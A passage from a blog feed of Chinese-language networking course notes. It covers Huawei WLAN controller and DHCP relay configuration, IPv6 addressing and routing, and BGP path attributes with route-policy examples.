//绑定安全模板</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-bangong]service-vlan</span> <span class="string">vlan-pool bangong  //绑定vlan池</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-bangong]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]vap-profile</span> <span class="string">name xuexi                    //创建vap模板，命名为xuexi</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-xuexi]ssid-profile</span> <span class="string">xuexi              //绑定ssid模板</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-xuexi]security-profile</span> <span class="string">xuexi          //绑定安全模板</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-xuexi]service-vlan</span> <span class="string">vlan-pool xuexi    //绑定vlan池</span></span><br><span class="line"><span class="attr">[AC6605-wlan-vap-prof-xuexi]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">9.将VAP配置文件绑定到AP组，把配置下发给AP组的物理设备</span></span><br><span class="line"><span class="attr">[AC6605]wlan</span></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-group</span> <span class="string">name bangong    //进入AP组</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-bangong]vap-profile</span> <span class="string">bangong wlan 1 radio 0</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-bangong]vap-profile</span> <span class="string">bangong wlan 1 radio 1</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-bangong]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[AC6605-wlan-view]ap-group</span> <span class="string">name bangong    //进入AP组</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-bangong]vap-profile</span> <span class="string">bangong wlan 1 radio 0</span></span><br><span class="line"><span class="attr">[AC6605-wlan-ap-group-bangong]vap-profile</span> <span class="string">bangong wlan 1 radio 1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">10.在HJ-SW1中创建vlan</span> <span class="string">101 102 103 104</span></span><br><span class="line"><span class="attr">[HJ-SW1]vlan</span> <span class="string">batch 101 102 103 104</span></span><br><span class="line"></span><br><span class="line"><span class="attr">11.在HX-SW2中创建vlan</span> <span class="string">101 102 103 104</span></span><br><span class="line"><span class="attr">[HX-SW2]vlan</span> <span class="string">batch 101 102 103 104</span></span><br><span class="line"></span><br><span class="line"><span class="attr">12.DHCP-R1配置DHCP功能，创建地址池</span></span><br><span class="line"><span class="attr">[DHCP-R1]ip</span> <span class="string">pool vlan101</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan101]network</span> <span class="string">192.168.101.0 mask 24</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan101]gateway-list</span> <span class="string">192.168.101.254</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan101]dns-list</span> <span class="string">8.8.8.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan101]ip</span> <span class="string">pool vlan102</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan102]network</span> <span class="string">192.168.102.0 mask 24</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan102]gateway-list</span> <span class="string">192.168.102.254</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan102]dns-list</span> <span class="string">8.8.8.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan102]ip</span> <span class="string">pool vlan103</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan103]network</span> <span class="string">192.168.103.0 mask 24</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan103]gateway-list</span> <span class="string">192.168.103.254</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan103]dns-list</span> <span class="string">8.8.8.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan103]ip</span> <span class="string">pool vlan104</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan104]network</span> <span class="string">192.168.104.0 mask 24</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan104]gateway-list</span> <span class="string">192.168.104.254</span></span><br><span class="line"><span class="attr">[DHCP-R1-ip-pool-vlan104]dns-list</span> <span class="string">8.8.8.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">13.核心交换机SW2配置网关地址</span></span><br><span class="line"><span class="attr">[HX-SW2]int</span> <span class="string">vlanif 101</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif101]ip</span> <span class="string">address 192.168.101.254 24</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif101]int</span> <span class="string">vlanif 102</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif102]ip</span> <span class="string">address 192.168.102.254 24</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif102]int</span> <span class="string">vlanif 103</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif103]ip</span> <span class="string">address 192.168.103.254 24</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif103]int</span> <span class="string">vlanif 104</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif104]ip</span> <span class="string">address 192.168.104.254 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">14.核心交换机SW2配置DHCP中继</span></span><br><span class="line"><span class="attr">[HX-SW2]dhcp</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">[HX-SW2]int</span> <span class="string">vlanif 101</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif101]dhcp</span> <span class="string">select relay</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif101]dhcp</span> <span class="string">relay server-ip 192.168.210.1</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif101]int</span> <span class="string">vlanif 102</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif102]dhcp</span> <span class="string">select relay</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif102]dhcp</span> <span class="string">relay server-ip 192.168.210.1</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif102]int</span> <span class="string">vlanif 103</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif103]dhcp</span> <span class="string">select relay</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif103]dhcp</span> <span class="string">relay server-ip 192.168.210.1</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif103]int</span> <span class="string">vlanif 104</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif104]dhcp</span> <span class="string">select relay</span></span><br><span class="line"><span class="attr">[HX-SW2-vlanif104]dhcp</span> <span class="string">relay server-ip 192.168.210.1</span></span><br></pre></td></tr></table></figure><h2 id="STA接入"><a href="#STA接入" class="headerlink" title="STA接入"></a>STA接入</h2><h3 id="STA接入-1"><a href="#STA接入-1" class="headerlink" title="STA接入"></a>STA接入</h3><p><strong>STA接入</strong></p><ul><li>CAPWAP隧道建立完成后，用户就可以接入无线网络</li><li>STA可以通过主动扫描，定期搜索周围的无线网络，获取到周围的无线网络信息</li><li>为了保证无线链路的安全，接入过程中AP需要完成对STA的认证</li><li>对数据报文还需要使用加密的方式来保证数据安全</li><li>STA获取到自身的IP地址，是STA正常上线的前提条件</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 骨干网与WLAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-骨干网与WLAN4</title>
      <link href="/posts/backbone4.html"/>
      <url>/posts/backbone4.html</url>
      
        <content type="html"><![CDATA[<h1 id="骨干网与WLAN"><a href="#骨干网与WLAN" class="headerlink" title="骨干网与WLAN"></a>骨干网与WLAN</h1><h2 id="IPv6概述"><a href="#IPv6概述" class="headerlink" title="IPv6概述"></a>IPv6概述</h2><h3 id="IPv4现状"><a href="#IPv4现状" class="headerlink" title="IPv4现状"></a>IPv4现状</h3><p><strong>Ipv4现状</strong></p><ul><li>IPv4地址不足，在NAT技术加持下，依然无法支撑全球使用</li><li>2011年2月3日，最后的468万个IPv4地址平均分配到全球5个RIR，此后IANA再没有可分配的IPv4地址</li><li>2019年11月25日IPv4地址分配完毕</li></ul><p><img src="/../img/img_artical/net_sec/7.4.1.png" alt="7.4.1"></p><h3 id="全球IPv6发展现状"><a href="#全球IPv6发展现状" class="headerlink" title="全球IPv6发展现状"></a>全球IPv6发展现状</h3><p><img src="/../img/img_artical/net_sec/7.4.2.png" alt="7.4.2"></p><h3 id="Why-IPv6？"><a href="#Why-IPv6？" class="headerlink" title="Why IPv6？"></a>Why IPv6？</h3><p><img src="/../img/img_artical/net_sec/7.4.3.png" alt="7.4.3"></p><h2 id="IPv6报文结构"><a href="#IPv6报文结构" class="headerlink" title="IPv6报文结构"></a>IPv6报文结构</h2><h3 id="IPv6报文一般由三个部分组成"><a href="#IPv6报文一般由三个部分组成" class="headerlink" title="IPv6报文一般由三个部分组成"></a>IPv6报文一般由三个部分组成</h3><ul><li>基本报头：路由器通过解析基本报头就能完成绝大多数的报文转发任务</li><li>扩展报文：提供一些扩展的报文转发信息，如分段、加密等，该部分不是必须的</li><li>上层数据协议单元：一般由上层协议报头和它的有效载荷组成，该部分与IPv4的上层协议数据单元相似</li></ul><p><img src="/../img/img_artical/net_sec/7.4.4.png" alt="7.4.4"></p><h3 id="IPv6基本报头"><a href="#IPv6基本报头" class="headerlink" title="IPv6基本报头"></a>IPv6基本报头</h3><p><strong>IPv6头部相较于IPv4的改进</strong></p><p><img src="/../img/img_artical/net_sec/7.4.5.png" alt="7.4.5"></p><p><strong>IPv6基本报头解析</strong></p><ul><li>IPv6基本报头也称之为固定报头。固定报头包含8个字段，总长度为40个字节</li><li>这8个字段分别为：<ul><li>版本（Version）：该字段规定了IP协议的版本，值为6。长度为4bit</li><li>流量类型（Traffic Class）：该字段功能和IPv4中的服务类型功能类似，表示IPv6数据报文的类或优先级。长度为8bit</li><li>流标签（Flow Label）：与IPv4相比，该字段是新增的，该字段长度为20bit。可以通过源IPv6地址+流标签来唯一确定一条数据流，也可以通过目的IPv6地址+流标签来唯一确定一条数据流</li><li>载荷长度（Payload Length）：该字段表示IPv6数据报有效载荷的长度，有效载荷是指紧跟IPv6报头的数据报的其它部分（即扩展报头），该字段长度为16bit，能表示最大长度为65535Byte的有效载荷</li><li>下一个报头（Next Header）：8bit,类似IPv4中的协议字段，主要为表示上层协议数据单元中的协议类型</li><li>跳数限制（Hop Limit）：8bit, 类似于IPv4中的TTL字段，主要是定义数据包经过的最大跳数，每经过一台设备，该值减1，该值为0时，数据包会被丢弃</li><li>源IPv6地址：128bit，发送方地址</li><li>目的IPv6地址：128bit，接收方地址</li></ul></li></ul><h2 id="IPv6地址分类"><a href="#IPv6地址分类" class="headerlink" title="IPv6地址分类"></a>IPv6地址分类</h2><h3 id="IPv6地址"><a href="#IPv6地址" class="headerlink" title="IPv6地址"></a>IPv6地址</h3><p><strong>IPv6地址</strong></p><ul><li>IPv6地址的长度为128bit，一般用冒号分割为8段，每一段16bit，每一段内用十六进制表示</li><li>与IPv4地址类似，IPv6也用“IPv6地址&#x2F;掩码长度”的方式来表示IPv6地址</li><li>IPv6地址中的字母大小不敏感，例如A等同于a</li><li>IPv6地址：2001:0DB8:2345:CD30:1230:4567:89AB:CDEF&#x2F;64</li></ul><p><img src="/../img/img_artical/net_sec/7.4.6.png" alt="7.4.6"></p><h3 id="IPv6地址空间"><a href="#IPv6地址空间" class="headerlink" title="IPv6地址空间"></a>IPv6地址空间</h3><p><strong>IPv6的128bit地址是一个什么概念？</strong></p><ul><li>IPv4有(2的32次方) &#x3D; 4,294,967,296个地址</li><li>IPv6有(2的128次方 &#x3D;2的96次方x2的32次方) &#x3D;340,282,366,920,938,463,463,374,607,431,768,211,456个地址(340万亿万亿万亿个地址)，相当于地球表面每平方米可以分配到67万亿个地址</li><li>夸张的说，地球上每一粒沙子都可以分配到一个IPv6地址</li></ul><h3 id="IPv6地址格式"><a href="#IPv6地址格式" class="headerlink" title="IPv6地址格式"></a>IPv6地址格式</h3><p><img src="/../img/img_artical/net_sec/7.4.7.png" alt="7.4.7"></p><h3 id="IPv6地址结构"><a href="#IPv6地址结构" class="headerlink" title="IPv6地址结构"></a>IPv6地址结构</h3><p><strong>一个IPv6地址可以分为如下两部分</strong></p><ul><li>网络前缀：nbit，相当于IPv4地址中的网络ID</li><li>接口标识：(128-n) bit，相当于IPv4地址中的主机ID</li></ul><p><strong>IPv6单播地址示例:2001:0DB8:6101:0001:5ED9:98FE:FECA:A298&#x2F;64</strong></p><p><img src="/../img/img_artical/net_sec/7.4.8.png" alt="7.4.8"></p><h3 id="IPv6地址前缀"><a href="#IPv6地址前缀" class="headerlink" title="IPv6地址前缀"></a>IPv6地址前缀</h3><p><strong>常用的IPv6地址或前缀有：</strong></p><table><thead><tr><th align="left">IPv6地址或前缀</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">2001::&#x2F;16</td><td align="left">用于IPv6 Internet，类似于IPv4公网地址</td></tr><tr><td align="left">2002::&#x2F;16</td><td align="left">用于6to4隧道</td></tr><tr><td align="left">FE80::&#x2F;10</td><td align="left">链路本地地址前缀，用于本地链路范围内的通信</td></tr><tr><td align="left">FF00::&#x2F;8</td><td align="left">组播地址前缀，用于IPv6组播</td></tr><tr><td align="left">::&#x2F;128</td><td align="left">未指定地址，类似于IPv4中的0.0.0.0</td></tr><tr><td align="left">::1&#x2F;128</td><td align="left">环回地址，类似于IPv4中的127.0.0.1</td></tr></tbody></table><h3 id="IPv6地址类型"><a href="#IPv6地址类型" class="headerlink" title="IPv6地址类型"></a>IPv6地址类型</h3><p><strong>IPv6地址分类</strong></p><p><img src="/../img/img_artical/net_sec/7.4.9.png" alt="7.4.9"></p><p><strong>单播地址（Unicast Address）</strong></p><ul><li>标识一个接口，目的地址为单播地址的报文会被送到被标识的接口</li><li>在IPv6中，一个接口拥有多个IPv6地址是非常常见的现象</li></ul><p><strong>组播地址（Multicast Address）</strong></p><ul><li><p>标识多个接口，目的地址为组播地址的报文会被送到被标识的所有接口</p></li><li><p>只有加入相应组播组的设备接口才会侦听发往该组播地址的报文</p></li></ul><p><strong>任播地址（Anycast Address）</strong></p><ul><li>任播地址标识一组网络接口 (通常属于不同的节点)</li><li>目标地址是任播地址的数据包将发送给其中路由意义上最近的一个网络接口</li></ul><p><strong>IPv6没有定义广播地址（BroadcastAddress）</strong></p><h3 id="IPv6地址和IPv4地址比较"><a href="#IPv6地址和IPv4地址比较" class="headerlink" title="IPv6地址和IPv4地址比较"></a>IPv6地址和IPv4地址比较</h3><table><thead><tr><th align="left"></th><th align="left">IPv4</th><th align="left">IPv6</th></tr></thead><tbody><tr><td align="left">地址空间</td><td align="left">2^32</td><td align="left">2^128</td></tr><tr><td align="left">表示方式</td><td align="left">点分十进制</td><td align="left">冒号隔开的十六进制</td></tr><tr><td align="left">地址类型</td><td align="left">单播、组播、广播</td><td align="left">单播、组播、任播</td></tr><tr><td align="left">其它</td><td align="left">A、B、C等主类地址</td><td align="left">IPv6中无此概念</td></tr><tr><td align="left"></td><td align="left">组播地址 (224.0.0.0&#x2F;4)</td><td align="left">IPv6组播地址 (FFO0::&#x2F;8)</td></tr><tr><td align="left"></td><td align="left">广播地址</td><td align="left">IPv6中无此概念</td></tr><tr><td align="left"></td><td align="left">未指定的地址0.0.0.0&#x2F;32</td><td align="left">未指定的地址::&#x2F;128</td></tr><tr><td align="left"></td><td align="left">环回地址127.0.0.0&#x2F;8</td><td align="left">环回地址是::1&#x2F;128</td></tr><tr><td align="left"></td><td align="left">公网IP地址</td><td align="left">全球单播地址</td></tr><tr><td align="left"></td><td align="left">私网IP地址(10.0.0.0&#x2F;8，172.16.0.0&#x2F;12以及192.168.0.0&#x2F;16)</td><td align="left">唯一本地地址 (FD00::&#x2F;8)</td></tr><tr><td align="left"></td><td align="left">APIPA地址(169.254.0.0&#x2F;16)</td><td align="left">链路本地地址(FE80::&#x2F;10)</td></tr></tbody></table><h2 id="IPv6基本配置"><a href="#IPv6基本配置" class="headerlink" title="IPv6基本配置"></a>IPv6基本配置</h2><h3 id="IPv6基本配置-1"><a href="#IPv6基本配置-1" class="headerlink" title="IPv6基本配置"></a>IPv6基本配置</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span></span><br><span class="line"><span class="attr">[Huawei]ipv6</span>                               <span class="string">//开启IPv6报文转发功能</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Huawei]interface</span> <span class="string">G0/0/0</span></span><br><span class="line"><span class="attr">[Huawei-G0/0/0]ipv6</span> <span class="string">enable                 //启动接口的IPv6功能</span></span><br><span class="line"><span class="attr">[Huawei-G0/0/0]ipv6</span> <span class="string">address 2001:12::1 64  //配置IPv6地址</span></span><br></pre></td></tr></table></figure><h2 id="IPv6静态路由实验"><a href="#IPv6静态路由实验" class="headerlink" title="IPv6静态路由实验"></a>IPv6静态路由实验</h2><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei]ipv6</span> <span class="string">route-static 2001:2:: 64 2001:12::1</span></span><br></pre></td></tr></table></figure><h2 id="IPv4-IPv6双栈"><a href="#IPv4-IPv6双栈" class="headerlink" title="IPv4&amp;IPv6双栈"></a>IPv4&amp;IPv6双栈</h2><h3 id="OSPFv3配置命令"><a href="#OSPFv3配置命令" class="headerlink" title="OSPFv3配置命令"></a>OSPFv3配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ospfv3</span> <span class="string">1</span></span><br><span class="line"><span class="attr">[R1-ospfv3-1]routerid</span> <span class="string">1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-ospfv3-1]quit</span></span><br><span class="line"><span class="attr">[R1]int</span> <span class="string">g0/0/1</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]ospfv3</span> <span class="string">1 area 12         //进入接口配置OSPFv3</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]intg0/0/0</span></span><br><span class="line"><span class="attr">[R1-G0/0/0]ospfv3</span> <span class="string">1 area 12</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 骨干网与WLAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-骨干网与WLAN3</title>
      <link href="/posts/backbone3.html"/>
      <url>/posts/backbone3.html</url>
      
        <content type="html"><![CDATA[<h1 id="骨干网与WLAN"><a href="#骨干网与WLAN" class="headerlink" title="骨干网与WLAN"></a>骨干网与WLAN</h1><h2 id="BGP路径属性"><a href="#BGP路径属性" class="headerlink" title="BGP路径属性"></a>BGP路径属性</h2><h3 id="BGP路径属性-1"><a href="#BGP路径属性-1" class="headerlink" title="BGP路径属性"></a>BGP路径属性</h3><p><strong>路径属性</strong></p><ul><li>任何一条BGP路由都拥有多个路径属性</li><li>当路由器将BGP路由通告给邻居时，会携带路径属性</li><li>BGP的路径属性将影响路由优选</li></ul><h3 id="路径属性分类"><a href="#路径属性分类" class="headerlink" title="路径属性分类"></a>路径属性分类</h3><p><strong>公认属性是所有BGP路由器都必须能够识别的属性</strong></p><ul><li><p>公认必遵：</p><ul><li><p>所有BGP设备都要认识这一类属性</p></li><li><p>必须包含在每个Update消息里</p></li><li><p>如果缺少这类属性，update报文不完整， 路由信息会出现错误</p></li><li><p>–Origin属性：起源属性，路由是通过network 注入的，还是通过import 注入的</p><p>–AS_path属性：这条路由是从哪里来的，从哪个AS号来的，经过了哪个AS号，</p><p>–Next_Hop：定义路由的下一跳信息</p></li></ul></li><li><p>公认任意：</p><ul><li>所有BGP设备认识此类属性</li><li>可能包括在某些Update消息里</li><li>如果缺少这类属性，路由信息不会出现错误</li><li>Local_Pref属性</li></ul></li></ul><p><strong>可选属性不需要都被BGP路由器所识别</strong></p><ul><li><p>可选过渡：</p><ul><li>BGP设备可以不识别此类属性，而且依然会接受该类属性并通告给其他对等体</li><li>Community：团体属性</li></ul></li><li><p>可选非过渡：</p><ul><li>BGP设备不识别此类属性会忽略该属性，且不会通告给其他对等体</li><li>MED属性</li></ul></li></ul><h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h3><p><strong>常用属性</strong></p><ul><li>Next_hop：下一跳属性</li><li>Local_Preference：本地优先级属性</li><li>AS_Path：路径属性</li><li>Origin：起源属性</li><li>MED：开销属性</li></ul><h3 id="BGP选路规则"><a href="#BGP选路规则" class="headerlink" title="BGP选路规则"></a>BGP选路规则</h3><p><strong>BGP选路原则：根据BGP属性来的，所以要先了解属性，在判断路由优选原则</strong></p><ul><li><p>(第一个)：丢弃下一跳不可达的路由</p><ul><li>这不是BGP选路原则（至少华为不是这么认为的），因为在任何路由协议中，我们都会认为下一跳不可达的路由是无效的</li></ul></li><li><p>1、比较”协议首选值-pref-val”属性，数值越大越好，默认值是0，只在本设备生效，不在网络中传递</p></li><li><p>2、比较”本地优先级-local_pref”属性，数值越大越好，默认值是100</p></li><li><p>3、比较：是本地始发的路由，还是从对等体学来的路由， 本地始发的BGP路由优于从其他对等体学习到的路由，本地始发的路由优先级：优选手动聚合 &gt; 自动聚合 &gt; network &gt; import &gt; 从对等体学到的</p></li><li><p>4、比较”as-path” 属性-as号越短越好</p></li><li><p>5、比较”起源属性”-指的是以什么方式注入进BGP协议的</p></li><li><p>6、比较”MED”属性，指的是一个路由器去往一个BGP路由网段的距离，类似cost</p></li><li><p>7、比较EBGP邻居优先于IBGP邻居，EBGP路由优先级高于IBGP路由</p></li><li><p>8、比较”去往BGP路由的下一跳IP地址”的cost开销值-越小越好</p><ul><li><p>如果前面8条选路规则无法选出最优的路由，我们就可以做负载均衡了</p><p>  备注：AS号一致，  在要负载均衡的那台设备上开启负载均衡功能</p></li></ul></li><li><p>9、比较”cluster-list”的长度，越短越好</p></li><li><p>10、比较Router ID（Orginator_ID）的大小，越小越好</p></li><li><p>11、比较”peer 后面的IP地址的大小”，越小越好</p></li></ul><h2 id="路由优选之Pre-val"><a href="#路由优选之Pre-val" class="headerlink" title="路由优选之Pre_val"></a>路由优选之Pre_val</h2><h3 id="Preferred-Value"><a href="#Preferred-Value" class="headerlink" title="Preferred_Value"></a>Preferred_Value</h3><ul><li>默认值0，数值越大越优先</li><li>华为特定的私有属性</li><li>只在本设备有效，不在网络中随路由传递</li></ul><h3 id="地址前缀列表"><a href="#地址前缀列表" class="headerlink" title="地址前缀列表"></a>地址前缀列表</h3><p><strong>地址前缀列表：ip-prefix</strong></p><ul><li>作用：专门做路由过滤的，不能过滤数据包</li><li>特点：匹配路由精准，既可以匹配前缀，又可以匹配掩码</li><li>配置：ip prefix 名字 动作 前缀 掩码</li></ul><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">第一步</span>: <span class="string">创建ip-prefix 抓取10.10.4.4的路由</span></span><br><span class="line"><span class="attr">[R3]ip</span> <span class="string">ip-prefix ntd index 10 permit 10.10.4.4 32</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第二步</span>: <span class="string">创建路由策略，匹配地址前缀列表，修改路由的属性</span></span><br><span class="line"><span class="attr">[R3]route-policy</span> <span class="string">tedu permit node 10        //创建路由策略</span></span><br><span class="line"><span class="attr">[R3-route-policy]if-match</span> <span class="string">ip-prefix ntd     //匹配ip-prefix ntd</span></span><br><span class="line"><span class="attr">[R3-route-policy]apply</span> <span class="string">preferred-value 123  //协议首选值为123</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第三步</span>: <span class="string">在BGP中调用路由策略</span></span><br><span class="line"><span class="attr">[R3]bgp</span> <span class="string">100</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">10.10.3.3 route-policy tedu import //入方向调用路由策略，因为协议首选值这个属性，只在我的本机起作用，不能在在网络中传递</span></span><br></pre></td></tr></table></figure><h2 id="路由优选之Next-hop"><a href="#路由优选之Next-hop" class="headerlink" title="路由优选之Next_hop"></a>路由优选之Next_hop</h2><h3 id="Next-hop"><a href="#Next-hop" class="headerlink" title="Next_hop"></a>Next_hop</h3><p><strong>BGP路由中的Next_hop属性设置规则</strong></p><ul><li>BGP路由器在向EBGP邻居发布路由时，会把该路由的下一跳设置为本地与对端建立BGP邻居关系的接口地址</li><li>BGP路由器将本地始发路由发布给IBGP邻居时，会把该路由的下一跳设置为本地与对端建立BGP邻居关系的接口地址</li><li>路由器在接收到EBGP邻居发布的路由后，在将路由传递给自己的IBGP邻居时，默认不修改路由的下一跳地址</li><li>下一跳不可达的路由会被丢弃</li></ul><h3 id="配置命令-1"><a href="#配置命令-1" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R3]bgp</span> <span class="string">100</span></span><br><span class="line"><span class="attr">[R3-bgp]peer10.10.1.1next-hop-local</span>   <span class="string">//修改下一跳地址为本地地址，即自己转发路由出去的接口地址</span></span><br></pre></td></tr></table></figure><h2 id="路由优选之Local-pref"><a href="#路由优选之Local-pref" class="headerlink" title="路由优选之Local_pref"></a>路由优选之Local_pref</h2><h3 id="本地优先级"><a href="#本地优先级" class="headerlink" title="本地优先级"></a>本地优先级</h3><p><strong>Local_preference属性</strong></p><ul><li>本地优先级属性，默认是100，数值越大越优先</li><li>该属性能再AS内部任意传递（IBGP邻居之间传递）</li><li>该属性不能再AS之间传递（EBGP邻居之间不携带该属性）</li><li>在AS的IBGP邻居之间，出方向和入方向都可以修改该属性</li></ul><h3 id="配置命令-2"><a href="#配置命令-2" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">第一步</span>: <span class="string">创建ip-prefix 抓取10.10.4.4的路由</span></span><br><span class="line"><span class="attr">[R3]ip</span> <span class="string">ip-prefix ntd index 10 permit 10.10.4.4 32</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第二步</span>: <span class="string">创建路由策略，匹配地址前缀列表，修改路由的属性</span></span><br><span class="line"><span class="attr">[R3]route-policy</span> <span class="string">tedu permit node 10        //创建路由策略</span></span><br><span class="line"><span class="attr">[R3-route-policy]if-match</span> <span class="string">ip-prefix ntd     //匹配ip-prefix ntd</span></span><br><span class="line"><span class="attr">[R3-route-policy]apply</span> <span class="string">local-preference 200 //本地优先级为200</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第三步</span>: <span class="string">在BGP中调用路由策略</span></span><br><span class="line"><span class="attr">[R3]bgp</span> <span class="string">100</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">10.10.3.3 route-policy tedu import //入方向调用路由策略</span></span><br></pre></td></tr></table></figure><h2 id="路由优选之AS-Path"><a href="#路由优选之AS-Path" class="headerlink" title="路由优选之AS_Path"></a>路由优选之AS_Path</h2><h3 id="AS-Path"><a href="#AS-Path" class="headerlink" title="AS_Path"></a>AS_Path</h3><p><strong>AS_Path</strong></p><ul><li>AS_Path属性按顺序记录一条路由从源地址到目的地址所经过的AS编号</li><li>AS_Path属性为公认必遵属性，任何一个BGP路由，都必须携带这个属性</li><li>AS_Path属性能防止EBGP邻居之间的环路，还可以做路由优选</li><li>路由在被通告给EBGP邻居时，路由器会在该路由的AS_Path中写上本地的AS号；路由被通告给IBGP对等体时，AS_Path不会发生改变</li><li>最右侧的为起源AS号，最左侧的为邻居的AS号：AS-path属性</li><li>AS号越短越优先（经过的AS号越少越优先）</li></ul><h3 id="配置命令-3"><a href="#配置命令-3" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">第一步</span>: <span class="string">创建ip-prefix 抓取10.10.4.4的路由</span></span><br><span class="line"><span class="attr">[R3]ip</span> <span class="string">ip-prefix ntd index 10 permit 10.10.4.4 32</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第二步</span>: <span class="string">创建路由策略，匹配地址前缀列表，修改路由的属性</span></span><br><span class="line"><span class="attr">[R3]route-policy</span> <span class="string">tedu permit node 10             //创建路由策略</span></span><br><span class="line"><span class="attr">[R3-route-policy]if-match</span> <span 